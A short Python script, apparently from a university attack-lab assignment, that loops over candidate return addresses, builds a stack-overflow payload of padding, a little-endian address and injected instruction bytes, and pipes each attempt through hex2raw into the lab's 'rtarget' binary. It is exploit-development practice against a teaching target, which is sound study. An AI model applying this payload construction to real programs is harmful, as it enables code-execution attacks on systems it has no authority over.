import subprocess as sp
import pdb

for i in range(4201265,4201323):

    d = hex(i)[2:]
    addr2_output = " "
    for k in range(len(d),0,-2):
        addr2_output = addr2_output + d[k-2:k] + " "

    addr2_output = addr2_output + "00 00 00 00 00 "

    output = addr2_output

    fill_buffer = ""
    for k in range(56):
        fill_buffer = fill_buffer + "00 "

    out_buffer = fill_buffer + output + "48 c7 c7 25 68 75 54 00"

    text_file = open("exploit4.txt", "w")
    text_file.write("%s" % out_buffer)
    text_file.close()

 #   sp.call(["./hex2raw", "<", "exploit4.txt", "|", "./rtarget"], shell=True)
    with open("exploit4.txt") as inhandle:
        p = sp.Popen("./hex2raw",stdin=inhandle,stdout=sp.PIPE, shell=True)
        p2 = sp.Popen("./rtarget",stdin=p.stdout, shell=True)
        [output,error] = p2.communicate()
        rc2 = p2.wait()
        rc = p.wait()
